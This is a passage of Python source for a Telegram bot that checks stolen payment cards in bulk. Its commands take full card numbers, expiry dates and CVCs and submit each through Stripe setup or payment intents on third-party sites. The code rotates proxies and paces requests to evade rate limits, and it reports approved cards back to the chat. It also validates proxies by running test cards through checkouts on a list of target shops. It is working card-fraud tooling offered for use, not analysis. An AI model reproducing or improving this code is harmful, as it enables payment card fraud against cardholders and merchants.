                        f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                        f"<b>Error:</b> {result}\n"
                        f"<b>User:</b> {username_display}\n"
                        f"<b>Gateway:</b> Stripe Setup Intent"
                    )
            
            await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
            logger.info(f"Result sent to user")
            
            # Rotate proxy for next card check
            old_proxy_index = proxy_index
            proxy_index = (proxy_index + 1) % len(user_proxies)
            current_proxy = user_proxies[proxy_index]
            if len(user_proxies) > 1:
                logger.info(f"Rotated proxy from {old_proxy_index + 1} to {proxy_index + 1}/{len(user_proxies)} for next card")
            
        except Exception as e:
            declined += 1
            logger.exception("Error checking card in cmd_st")
            await update.message.reply_text(
                f"❌ <b>Error checking card</b>\n\n"
                f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                f"<b>Error:</b> {e}",
                parse_mode=ParseMode.HTML
            )
        
        # Update ACTIVE_BATCHES counts for /active command
        try:
            async with ACTIVE_LOCK:
                rec = ACTIVE_BATCHES.get(batch_id)
                if rec is not None:
                    rec["counts"]["processed"] = idx
                    rec["counts"]["approved"] = approved
                    rec["counts"]["declined"] = declined
                    ACTIVE_BATCHES[batch_id] = rec
        except Exception:
            pass
        
        # Update pending with progress for resume after reboot
        try:
            await add_pending(batch_id, {
                "batch_id": batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": "ST Batch",
                "cards": [{"number": c['number'], "month": int(c['exp_month']), "year": int(c['exp_year']), "verification_value": c['cvc']} for c in cards],
                "sites": [],
                "send_approved_notifications": True,
                "processed": idx
            })
        except Exception:
            pass
    
    async with ACTIVE_LOCK:
        if batch_id in ACTIVE_BATCHES:
            del ACTIVE_BATCHES[batch_id]
    
    # Remove from pending when complete
    try:
        await remove_pending(batch_id)
    except Exception:
        pass
    
    logger.info(f"========== /st COMMAND COMPLETED ==========")
    logger.info(f"Total cards checked: {total_cards}")
    logger.info(f"Approved: {approved} | Declined: {declined}")
    
    await summary_msg.edit_text(
        f"✅ <b>Checking Complete!</b>\n\n"
        f"<b>Total:</b> {total_cards}\n"
        f"<b>Approved:</b> {approved} ✅\n"
        f"<b>Declined:</b> {declined} ❌",
        parse_mode=ParseMode.HTML,
        reply_markup=None
    )

async def cmd_sc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check credit cards using Stripe payment intent (t2.py)"""
    user = update.effective_user
    chat = update.effective_chat
    
    # Check if user already has an active batch (admins bypass)
    if await has_active_batch(user.id):
        await update.message.reply_text(
            "⏸️ <b>Already Running a Check</b>\n\n"
            "You already have an active check running. Please wait for it to complete or use /stop to cancel it.\n\n"
            "You can only run one check at a time.",
            parse_mode=ParseMode.HTML
        )
        return
    logger.info(f"========== /sc COMMAND STARTED ==========")
    logger.info(f"User: {user.full_name} (@{user.username}) [ID: {user.id}]")
    logger.info(f"Chat: {chat.title or chat.type} [ID: {chat.id}]")
    
    if not await ensure_access(update, context):
        logger.info(f"Access denied for user {user.id}")
        return
    
    # Check for user's proxy - REQUIRED like /txt and /sh
    try:
        user_proxies = await get_user_proxies(user.id)
        if not user_proxies:
            await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
            return
    except Exception:
        await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
        return
    
    # Use first proxy from user's list
    user_proxy = user_proxies[0]
    logger.info(f"Using user proxy: {user_proxy[:20]}...")
    try:
        await update.message.reply_text(f"🔒 Using your {len(user_proxies)} saved {'proxy' if len(user_proxies) == 1 else 'proxies'}")
    except Exception:
        pass
    
    import uuid
    batch_id = f"sc_{user.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    cancel_event = asyncio.Event()
    
    full_text = (update.message.text or "").strip()
    logger.info(f"Full command text: {full_text}")
    
    replied_to = update.message.reply_to_message
    if replied_to and replied_to.text:
        replied_text = replied_to.text.strip()
        logger.info(f"This is a reply to a message: {replied_text[:100]}")
        cards_from_reply = parse_cards_from_text(replied_text)
        if cards_from_reply:
            logger.info(f"Found {len(cards_from_reply)} card(s) in replied message")
            cards_input = []
            for card in cards_from_reply:
                card_str = f"{card['number']}|{card['month']:02d}|{card['year']}|{card['verification_value']}"
                cards_input.append(card_str)
        else:
            cards_input = []
    else:
        cards_input = []
        try:
            if full_text.lower().startswith("/sc"):
                lines = full_text.split("\n")
                
                first_line = lines[0].strip()
                parts = first_line.split(" ", 1)
                if len(parts) >= 2:
                    cards_input.append(parts[1].strip())
                
                for line in lines[1:]:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        cards_input.append(line)
        except Exception:
            pass
    
    if not cards_input:
        logger.warning("No cards provided in /sc command")
        await update.message.reply_text(
            "Usage: /sc <card> or /sc <card1>\\n<card2>\\n...\n\n"
            "Examples:\n"
            "Single card:\n"
            "/sc 5429338632473654|12|2028|490\n\n"
            "Multiple cards:\n"
            "/sc 5421880346864254|06|26|948\n"
            "5429338632473654|12|2028|490\n\n"
            "💡 You can also reply to any message containing cards with /sc\n\n"
            "Format: number|month|year|cvc"
        )
        return
    
    logger.info(f"Extracted {len(cards_input)} card(s) from input")
    
    # Remove duplicates while preserving order
    seen_cards = set()
    unique_cards_input = []
    for card_input in cards_input:
        card_key = card_input.strip().lower()
        if card_key not in seen_cards:
            seen_cards.add(card_key)
            unique_cards_input.append(card_input)
    
    if len(cards_input) != len(unique_cards_input):
        logger.info(f"Removed {len(cards_input) - len(unique_cards_input)} duplicate card(s) from /sc input")
        await update.message.reply_text(f"ℹ️ Removed {len(cards_input) - len(unique_cards_input)} duplicate card(s) from input")
    
    cards = []
    failed_cards = []
    for card_input in unique_cards_input:
        try:
            parsed = checkout.parse_cc_line(card_input)
            if parsed:
                cards.append({
                    'number': parsed['number'],
                    'exp_month': f"{parsed['month']:02d}",
                    'exp_year': str(parsed['year']),
                    'cvc': parsed['verification_value']
                })
            else:
                failed_cards.append(card_input)
        except Exception as e:
            logger.error(f"Error parsing card '{card_input}': {e}")
            failed_cards.append(card_input)
    
    if failed_cards:
        await update.message.reply_text(
            f"❌ Could not parse {len(failed_cards)} card(s):\n" + 
            "\n".join(f"• {c[:50]}" for c in failed_cards[:5]) +
            ("\n..." if len(failed_cards) > 5 else "") +
            "\n\nSupported formats:\n"
            "• 4520112895857270|04|27|393\n"
            "• 4520112895857270 04 27 393\n"
            "• card: 4520112895857270, exp: 04/27, cvv: 393\n"
            "• 4520 1128 9585 7270|04|2027|393"
        )
        if not cards:
            return
    
    logger.info(f"Successfully parsed {len(cards)} card(s)")
    for i, card in enumerate(cards, 1):
        logger.info(f"  Card {i}: {card['number'][:6]}...{card['number'][-4:]} | {card['exp_month']}/{card['exp_year']}")
    
    start_ts = time.time()
    async with ACTIVE_LOCK:
        ACTIVE_BATCHES[batch_id] = {
            "event": cancel_event,
            "chat_id": update.effective_chat.id,
            "user_id": update.effective_user.id,
            "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
            "user_username": getattr(update.effective_user, "username", None),
            "counts": {
                "total": len(cards),
                "processed": 0,
                "approved": 0,
                "declined": 0,
                "start_ts": start_ts,
                "title": "SC Batch",
            },
        }
    
    # Save to pending so it can resume after reboot
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": "SC Batch",
            "cards": [{"number": c['number'], "month": int(c['exp_month']), "year": int(c['exp_year']), "verification_value": c['cvc']} for c in cards],
            "sites": [],  # SC doesn't use sites
            "send_approved_notifications": True,
            "processed": 0
        })
    except Exception:
        pass
    
    total_cards = len(cards)
    stop_button = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{batch_id}")]])
    summary_msg = await update.message.reply_text(
        f"🔍 Checking {total_cards} card{'s' if total_cards > 1 else ''}...\n"
        f"⏳ Please wait...",
        reply_markup=stop_button
    )
    
    approved = 0
    declined = 0
    
    last_progress_update = 0.0
    progress_update_interval = 2.0
    
    logger.info(f"Starting card checking process for {total_cards} card(s)")
    
    for idx, card_details in enumerate(cards, 1):
        if cancel_event.is_set():
            logger.info(f"❌ Batch {batch_id} was cancelled by user")
            await summary_msg.edit_text(
                f"⏹ <b>Checking Stopped!</b>\n\n"
                f"<b>Total:</b> {total_cards}\n"
                f"<b>Processed:</b> {idx - 1}/{total_cards}\n"
                f"<b>Approved:</b> {approved} ✅\n"
                f"<b>Declined:</b> {declined} ❌",
                parse_mode=ParseMode.HTML,
                reply_markup=None
            )
            break
            
        logger.info(f"---------- Checking card {idx}/{total_cards} ----------")
        logger.info(f"Card: {card_details['number'][:6]}...{card_details['number'][-4:]} | {card_details['exp_month']}/{card_details['exp_year']} | CVV: {card_details['cvc']}")
        try:
            current_time = time.time()
            if current_time - last_progress_update >= progress_update_interval:
                await summary_msg.edit_text(
                    f"🔍 Checking card {idx}/{total_cards}...\n"
                    f"⏳ Card ending in {card_details['number'][-4:]}...\n\n"
                    f"✅ Approved: {approved}\n"
                    f"❌ Declined: {declined}",
                    reply_markup=stop_button
                )
                last_progress_update = current_time
            
            if idx > 1:
                delay = 2.5
                logger.info(f"Waiting {delay}s before next card to avoid rate limiting...")
                for _ in range(5):
                    if cancel_event.is_set():
                        break
                    await asyncio.sleep(0.5)
            
            loop = asyncio.get_running_loop()
            
            logger.info(f"[SC-Step 1/3] Getting Firebase token and UID...")
            firebase_token, uid = await loop.run_in_executor(
                GLOBAL_EXECUTOR, t2.get_firebase_token_and_uid, t2.FIREBASE_API_KEY, user_proxy
            )
            logger.info(f"[SC-Step 1/3] Firebase Token: {firebase_token[:20] if firebase_token else 'None'}...")
            logger.info(f"[SC-Step 1/3] UID: {uid}")
            
            if not firebase_token or not uid:
                declined += 1
                logger.warning(f"[SC-Step 1/3] FAILED - Could not get Firebase token")
                await update.message.reply_text(
                    f"❌ <b>Failed to get Firebase token</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            logger.info(f"[SC-Step 2/3] Getting checkout info (payment intent)...")
            checkout_data = await loop.run_in_executor(
                GLOBAL_EXECUTOR, t2.get_checkout_info, firebase_token, uid, user_proxy
            )
            logger.info(f"[SC-Step 2/3] Checkout Data: {checkout_data}")
            
            if not checkout_data or 'result' not in checkout_data:
                declined += 1
                logger.warning(f"[SC-Step 2/3] FAILED - Could not get payment intent")
                await update.message.reply_text(
                    f"❌ <b>Failed to get payment intent</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            result = checkout_data['result']
            payment_intent_id = result.get('paymentIntent')
            client_secret = result.get('clientSecret')
            
            logger.info(f"[SC-Step 2/3] Payment Intent ID: {payment_intent_id}")
            logger.info(f"[SC-Step 2/3] Client Secret: {client_secret[:20] if client_secret else 'None'}...")
            
            if not payment_intent_id or not client_secret:
                declined += 1
                logger.warning(f"[SC-Step 2/3] FAILED - Could not extract payment intent details")
                await update.message.reply_text(
                    f"❌ <b>Failed to extract payment intent details</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            logger.info(f"[SC-Step 3/3] Confirming Stripe payment...")
            should_save, response_data, reason = await loop.run_in_executor(
                GLOBAL_EXECUTOR,
                t2.confirm_stripe_payment,
                payment_intent_id,
                client_secret,
                card_details['number'],
                card_details['exp_month'],
                card_details['exp_year'],
                card_details['cvc'],
                user_proxy
            )
            logger.info(f"[SC-Step 3/3] Should Save: {should_save}")
            logger.info(f"[SC-Step 3/3] Reason: {reason}")
            logger.info(f"[SC-Step 3/3] Response Data: {response_data}")
            
            username = update.effective_user.username
            user_id = update.effective_user.id
            full_name = update.effective_user.full_name or str(user_id)
            username_display = f'<a href="tg://user?id={user_id}">{username if username else full_name}</a>'
            
            if should_save:
                approved += 1
                logger.info(f"✅ CARD APPROVED")
                
                status = response_data.get('status', 'Unknown')
                payment_method = response_data.get('payment_method', {})
                
                if isinstance(payment_method, str):
                    charges = response_data.get('charges', {}).get('data', [])
                    if charges:
                        payment_method_details = charges[0].get('payment_method_details', {})
                        card_info = payment_method_details.get('card', {})
                    else:
                        card_info = {}
                else:
                    card_info = payment_method.get('card', {})
                
                brand = card_info.get('brand', 'Unknown').title()
                country = card_info.get('country', 'Unknown')
                funding = card_info.get('funding', 'Unknown')
                
                amount = response_data.get('amount', 0)
                currency = response_data.get('currency', 'usd')
                formatted_amount = t2.format_amount(amount, currency)
                
                logger.info(f"Status: {status}, Brand: {brand}, Country: {country}, Type: {funding}")
                logger.info(f"Amount: {formatted_amount}")
                
                response_text = (
                    f"<b>UID:</b> {uid}\n"
                    f"<b>Intent:</b> {payment_intent_id}\n\n"
                    f"✅ <b>Card Approved</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                    f"<b>Reason:</b> {reason}\n"
                    f"<b>Amount:</b> {formatted_amount}\n"
                    f"<b>User:</b> {username_display}\n"
                    f"<b>Gateway:</b> Stripe Payment Intent"
                )
            else:
                declined += 1
                logger.warning(f"❌ CARD DECLINED")
                error_info = response_data.get('error', {})
                error_code = error_info.get('code', 'Unknown')
                decline_code = error_info.get('decline_code', 'N/A')
                message = error_info.get('message', 'No message')
                
                payment_intent_data = error_info.get("payment_intent", {})
                if payment_intent_data:
                    amount = payment_intent_data.get("amount", 0)
                    currency = payment_intent_data.get("currency", 'usd')
                else:
                    amount = response_data.get("amount", 0)
                    currency = response_data.get("currency", 'usd')
                
                formatted_amount = t2.format_amount(amount, currency)
                
                logger.info(f"Error Code: {error_code}, Decline Code: {decline_code}, Message: {message}")
                logger.info(f"Amount: {formatted_amount}")
                
                response_text = (
                    f"<b>UID:</b> {uid}\n"
                    f"<b>Intent:</b> {payment_intent_id}\n\n"
                    f"❌ <b>Card Declined</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                    f"<b>Reason:</b> {reason}\n"
                    f"<b>Error Code:</b> {error_code}\n"
                    f"<b>Decline Code:</b> {decline_code}\n"
                    f"<b>Message:</b> {message}\n"
                    f"<b>Amount:</b> {formatted_amount}\n"
                    f"<b>User:</b> {username_display}\n"
                    f"<b>Gateway:</b> Stripe Payment Intent"
                )
            
            await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
            logger.info(f"Result sent to user")
            
        except Exception as e:
            declined += 1
            logger.exception("Error checking card in cmd_sc")
            await update.message.reply_text(
                f"❌ <b>Error checking card</b>\n\n"
                f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                f"<b>Error:</b> {e}",
                parse_mode=ParseMode.HTML
            )
        
        # Update ACTIVE_BATCHES counts for /active command
        try:
            async with ACTIVE_LOCK:
                rec = ACTIVE_BATCHES.get(batch_id)
                if rec is not None:
                    rec["counts"]["processed"] = idx
                    rec["counts"]["approved"] = approved
                    rec["counts"]["declined"] = declined
                    ACTIVE_BATCHES[batch_id] = rec
        except Exception:
            pass
        
        # Update pending with progress for resume after reboot
        try:
            await add_pending(batch_id, {
                "batch_id": batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": "SC Batch",
                "cards": [{"number": c['number'], "month": int(c['exp_month']), "year": int(c['exp_year']), "verification_value": c['cvc']} for c in cards],
                "sites": [],
                "send_approved_notifications": True,
                "processed": idx
            })
        except Exception:
            pass
    
    async with ACTIVE_LOCK:
        if batch_id in ACTIVE_BATCHES:
            del ACTIVE_BATCHES[batch_id]
    
    # Remove from pending when complete
    try:
        await remove_pending(batch_id)
    except Exception:
        pass
    
    logger.info(f"========== /sc COMMAND COMPLETED ==========")
    logger.info(f"Total cards checked: {total_cards}")
    logger.info(f"Approved: {approved} | Declined: {declined}")
    
    await summary_msg.edit_text(
        f"✅ <b>Checking Complete!</b>\n\n"
        f"<b>Total:</b> {total_cards}\n"
        f"<b>Approved:</b> {approved} ✅\n"
        f"<b>Declined:</b> {declined} ❌",
        parse_mode=ParseMode.HTML,
        reply_markup=None
    )

async def cmd_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/setpr"):
            args = full_text[6:].strip()
    except Exception:
        args = ""

    replied = update.message.reply_to_message
    reply_text = ""
    if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
        reply_text = replied.text.strip()

    source_text = args if args else reply_text

    if not source_text:
        await update.message.reply_text(
            "Usage:\n"
            "/setpr <proxy>\n"
            "Examples:\n"
            "/setpr 1.2.3.4:8080\n"
            "/setpr user:pass@1.2.3.4:8080\n"
            "/setpr socks5://user:pass@1.2.3.4:1080\n"
            "\nMass add (multi-line):\n"
            "/setpr\n"
            "142.111.48.253:7030:ikletqkv:i1tjcun49r4d\n"
            "31.59.20.176:6754:ikletqkv:i1tjcun49r4d\n"
            "...\n"
        )
        return

    raw_lines = [ln.strip() for ln in source_text.splitlines() if (ln or "").strip()]
    proxies_raw: List[str] = []
    card_line: Optional[str] = None

    for ln in raw_lines:
        s = (ln or "").strip()
        if not s:
            continue
        low = s.lower()
        
        # Skip notification message lines (card check results, not proxies)
        notification_markers = ["⌁", "status:", "code:", "site:", "amount:", "receipt:", "user:", "card:", "declined", "approved", "charged", "💎", "❎", "❌"]
        if any(marker in low or marker in s for marker in notification_markers):
            continue
        
        # Skip HTML tags from Telegram messages
        if s.startswith("<") and (">" in s):
            continue
        
        if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
            val = s.split("=", 1)[1].strip() if "=" in s else s.split(":", 1)[1].strip() if ":" in s else s.split(" ", 1)[1].strip() if " " in s else ""
            if val:
                proxies_raw.append(val)
            continue
        maybe_card = None
        try:
            maybe_card = checkout.parse_cc_line(s)
        except Exception:
            maybe_card = None
        if maybe_card and (card_line is None):
            card_line = s
            continue
        proxies_raw.append(s)

    if not proxies_raw:
        await update.message.reply_text("No proxy lines detected. Provide one or more proxies (each on a new line).")
        return

    normalized_list: List[str] = []
    seen_norm = set()
    for pr in proxies_raw:
        n = normalize_proxy_url(pr)
        if not n:
            continue
        if n not in seen_norm:
            seen_norm.add(n)
            normalized_list.append(n)

    if not normalized_list:
        await update.message.reply_text("All provided proxies were invalid format. Expected host:port or ip:port:user:pass (http by default), or user:pass@host:port.")
        return

    test_cards = [
        {
            "number": "4906388577508357",
            "month": "11",
            "year": "28",
            "verification_value": "824"
        },
        {
            "number": "4532915710095558",
            "month": "12",
            "year": "27",
            "verification_value": "123"
        }
    ]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    test_sites = list(sites)
    # Ensure we have at least 3 sites for sequential testing
    if len(test_sites) < 3:
        await update.message.reply_text(f"❌ Need at least 3 sites in working_sites.txt for proxy testing. Found: {len(test_sites)}")
        return
    # Randomize the order to ensure different sites are tested
    random.shuffle(test_sites)
    # Use up to 3 sites in the pool (will test up to 3 sites per proxy sequentially)
    if len(test_sites) > 3:
        test_sites = random.sample(test_sites, 3)

    user = update.effective_user
    display_name = (user.full_name or "").strip()
    if not display_name:
        uname = (user.username or "").strip()
        display_name = f"@{uname}" if uname else str(user.id)
    try:
        existing_list = await get_user_proxies(user.id)
    except Exception:
        existing_list = []
    existing_set = set(existing_list or [])

    added_count = 0
    duplicate_count = 0
    failed_count = 0

    total_proxies = len(normalized_list)
    
    testing_msg = await update.message.reply_text(f"🔄 Testing {total_proxies} proxy(ies) in parallel...\n\nPlease wait...")
    
    loop = asyncio.get_running_loop()
    
    # Increased semaphore for faster parallel testing (100 concurrent tests)
    semaphore = asyncio.Semaphore(100)
    
    # Track sites that consistently fail with "auto-detect" errors
    broken_sites = set()
    
    async def test_single_proxy(p, idx):
        async with semaphore:
            proxy_working = False
            
            # Test up to 3 sites sequentially
            max_sites_to_test = min(3, len(test_sites))
            if max_sites_to_test < 1:
                return (p, False, idx)
            
            # Test each site sequentially until step 4 is reached
            for site_idx in range(max_sites_to_test):
                test_site = test_sites[site_idx]
                site_number = site_idx + 1
                
                print(f"  [SETPR] Proxy {idx}: Testing site {site_number}/{max_sites_to_test} - {test_site[:50]}...")
                
                try:
                    # Test this site with timeout for faster failure
                    site_result = await asyncio.wait_for(
                        loop.run_in_executor(
                            GLOBAL_EXECUTOR,
                            check_single_card,
                            test_cards[0],
                            [test_site],
                            {"http": p, "https": p},
                            None
                        ),
                        timeout=50.0  # 50 second timeout per site test
                    )
                    
                    if len(site_result) >= 6:
                        status = site_result[0]
                        code_display = site_result[1]
                        
                        # Check if proxy reached Step 4 (submission step)
                        code_upper = (code_display or "").upper()
                        msg_lower = (code_display or "").lower() if isinstance(code_display, str) else ""
                        
                        # Step 4 indicators - if any of these appear, proxy reached step 4
                        step4_reached = False
                        step4_reason = ""
                        
                        # Check 1: Status is success (approved/declined/charged means step 4+ completed)
                        if status in ("approved", "declined", "charged"):
                            step4_reached = True
                            step4_reason = f"Step 4+ reached (status: {status})"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        
                        # Check 2: Explicit step 4 indicators in code (MUST CHECK FIRST before other checks)
                        elif "CAPTCHA_METADATA_MISSING" in code_upper:
                            step4_reached = True
                            step4_reason = "Step 4 reached (CAPTCHA_METADATA_MISSING)"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        elif any(indicator in code_upper for indicator in [
                            "SUBMIT", "PAYMENTS_CREDIT_CARD_SESSION_ID",
                            "HTTP_402", "HTTP_403", "SUBMITREJECTED", "SUBMITFAILED", 
                            "STEP 4", "[4/5]", "STEP4"
                        ]):
                            step4_reached = True
                            step4_reason = f"Step 4 reached (code: {code_display[:80]}...)"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        
                        # Check 3: Checkout/submit related errors (means got to step 4)
                        elif "captcha_metadata_missing" in msg_lower:
                            step4_reached = True
                            step4_reason = "Step 4 reached (captcha_metadata_missing in message)"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        elif any(sig in msg_lower for sig in [
                            "submit", "receipt", "proposal", "queue_token", "shipping_handle",
                            "step 4", "step4", "submitforcompletion",
                            "payments_credit_card_session_id", "no receipt_id", "http_402", 
                            "http_403", "submitrejected", "submitfailed", "phone required"
                        ]):
                            step4_reached = True
                            step4_reason = f"Step 4 reached (error: {msg_lower[:80]}...)"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        
                        # Check 4: Site-level HTTP errors (means proxy worked, site blocked)
                        elif any(sig in msg_lower for sig in [
                            "402", "403", "payment required", "forbidden"
                        ]):
                            step4_reached = True
                            step4_reason = f"Proxy reached site (HTTP error: {msg_lower[:80]}...)"
                            print(f"  [SETPR] Site {site_number}: ✅ ACCEPTED - {step4_reason}")
                        
                        # If step 4 reached, proxy is working - ADD IT IMMEDIATELY and exit
                        if step4_reached:
                            proxy_working = True
                            print(f"  [SETPR] Proxy {idx}: ✅ INSTANT ADD - Step 4 confirmed on site {site_number} ({step4_reason})")
                            # Add proxy immediately and return
                            try:
                                if p not in existing_set:
                                    await add_user_proxy(user.id, display_name, user.username, p)
                                    existing_set.add(p)
                                    print(f"  [SETPR] Proxy {idx}: ✅ Added to database immediately")
                                else:
                                    print(f"  [SETPR] Proxy {idx}: ✅ Already in database")
                            except Exception as add_err:
                                print(f"  [SETPR] Proxy {idx}: ⚠️ Failed to add to database: {add_err}")
                            return (p, True, idx)  # Early exit - don't test more sites!
                        
                        # If no step 4 indicators, check for clear proxy death signals
                        else:
                            # Check for broken site (not proxy issue)
                            if any(sig in msg_lower for sig in [
                                "could not auto-detect", "auto-detect any products", "failed to detect products"
                            ]):
                                broken_sites.add(test_site)
                                print(f"  [SETPR] Site {site_number}: ⚠️ INCONCLUSIVE - Site broken, trying next site...")
                                continue  # Try next site
                            
                            # Check for clear proxy errors
                            proxy_error_signals = [
                                "unable to connect to proxy", "proxyerror", "max retries exceeded",
                                "tunnel connection failed", "connect timeout", "connection refused",
                                "connection timed out", "failed to establish", "target machine actively refused",
                                "winerror 10061", "no connection could be made", "httpsconnectionpool",
                                "httpconnectionpool", "connectionpool", "proxy server", "proxy connection",
                                "consecutive attempts"
                            ]
                            
                            is_429_proxy_error = "429" in msg_lower and ("proxy" in msg_lower or "tunnel" in msg_lower)
                            
                            if is_429_proxy_error or any(sig in msg_lower for sig in proxy_error_signals):
                                print(f"  [SETPR] Site {site_number}: ❌ REJECTED - Proxy error detected")
                                # Continue to next site (don't return yet, might work on another site)
                                continue
                            else:
                                # Unknown result, try next site
                                print(f"  [SETPR] Site {site_number}: ⚠️ INCONCLUSIVE - Unknown result, trying next site...")
                                continue
                
                except asyncio.TimeoutError:
                    # Timeout - proxy is likely dead or too slow
                    print(f"  [SETPR] Site {site_number}: ❌ TIMEOUT - Proxy too slow (>50s)")
                    continue  # Try next site
                except Exception as e:
                    # Check if exception is proxy-related
                    err_msg = str(e).lower()
                    if any(sig in err_msg for sig in [
                        "unable to connect to proxy", "proxyerror", "proxy connection",
                        "tunnel connection failed", "connection refused", "failed to establish",
                        "target machine actively refused", "winerror 10061", "proxy server"
                    ]):
                        print(f"  [SETPR] Site {site_number}: ❌ REJECTED - Proxy exception: {str(e)[:80]}...")
                        continue  # Try next site
                    else:
                        # Non-proxy exception, might be site issue
                        print(f"  [SETPR] Site {site_number}: ⚠️ INCONCLUSIVE - Exception (not proxy): {str(e)[:80]}...")
                        continue  # Try next site
            
            # If we tested all sites and none confirmed step 4, proxy is dead
            print(f"  [SETPR] Proxy {idx}: ❌ DEAD - All {max_sites_to_test} sites rejected")
            return (p, False, idx)
    
    tasks = [test_single_proxy(p, idx) for idx, p in enumerate(normalized_list, 1)]
    results = await asyncio.gather(*tasks)
    
    result_messages = []
    for p, proxy_working, idx in results:
        if proxy_working:
            # Proxy was already added in test_single_proxy if step 4 was reached
            # Check if it's a duplicate or was just added
            if p in existing_set:
                duplicate_count += 1
                result_messages.append(f"{idx}. ✅ {_mask_proxy_display(p)} - Already Added")
            else:
                # Proxy was added during testing, just count it
                added_count += 1
                result_messages.append(f"{idx}. ✅ {_mask_proxy_display(p)} - Added")
        else:
            failed_count += 1
            result_messages.append(f"{idx}. ❌ {_mask_proxy_display(p)} - Failed")
    
    try:
        await testing_msg.delete()
    except Exception:
        pass
    
    batch_size = 20
    for i in range(0, len(result_messages), batch_size):
        batch = result_messages[i:i+batch_size]
        await update.message.reply_text("\n".join(batch))
    
    # DISABLED: Site removal disabled - never remove sites
    # Remove broken sites from working_sites.txt
    if broken_sites:
        # DISABLED: Site removal is disabled
        # try:
        #     sites_file = "working_sites.txt"
        #     removed_count = 0
        #     
        #     # Read current sites
        #     current_sites = checkout.read_sites_from_file(sites_file)
        #     if current_sites:
        #         # Filter out broken sites
        #         updated_sites = [s for s in current_sites if s not in broken_sites]
        #         removed_count = len(current_sites) - len(updated_sites)
        #         
        #         if removed_count > 0:
        #             # Write back to file
        #             with open(sites_file, "w", encoding="utf-8") as f:
        #                 for site in updated_sites:
        #                     f.write(f"{site}\n")
        #             
        #             # Clear the sites cache to force reload
        #             global SITES_CACHE, SITES_CACHE_MTIME
        #             with SITES_CACHE_LOCK:
        #                 SITES_CACHE = None
        #                 SITES_CACHE_MTIME = 0
        #             
        #             broken_list = "\n".join([f"  • {site}" for site in broken_sites])
        #             await update.message.reply_text(
        #                 f"⚠️ <b>Removed {removed_count} Broken Site(s)</b>\n\n"
        #                 f"These sites failed with 'Could not auto-detect products':\n"
        #                 f"{broken_list}\n\n"
        #                 f"Remaining sites: {len(updated_sites)}",
        #                 parse_mode=ParseMode.HTML
        #             )
        # except Exception as e:
        #     logger.error(f"Failed to remove broken sites: {e}")
        broken_list = "\n".join([f"  • {site}" for site in broken_sites])
        await update.message.reply_text(
            f"⚠️ <b>Found {len(broken_sites)} Broken Site(s) (Removal Disabled)</b>\n\n"
            f"These sites failed with 'Could not auto-detect products':\n"
            f"{broken_list}\n\n"
            f"<i>Note: Site removal is disabled. Sites remain in working_sites.txt.</i>",
            parse_mode=ParseMode.HTML
        )
    
    if added_count > 0:
        try:
            msg = f"Added {added_count} Proxy" if added_count == 1 else f"Added {added_count} Proxies"
            await update.message.reply_text(msg)
        except Exception:
            pass
        
        try:
            pend = await list_pending()
            if isinstance(pend, dict) and pend:
                user_batches = []
                for batch_id, payload in pend.items():
                    try:
                        batch_user_id = int(payload.get("user_id", 0))
                        if batch_user_id == user.id:
                            user_batches.append((batch_id, payload))
                            logger.info(f"Found pending batch {batch_id} for user {user.id}")
                    except Exception as e:
                        logger.error(f"Error parsing batch {batch_id}: {e}")
                        continue
                
                if not user_batches:
                    logger.info(f"No pending batches found for user {user.id}")
                
                for batch_id, payload in user_batches:
                    try:
                        chat_id = int(payload.get("chat_id"))
                        title = payload.get("title") or "Batch"
                        cards = payload.get("cards") or []
                        sites = payload.get("sites") or []
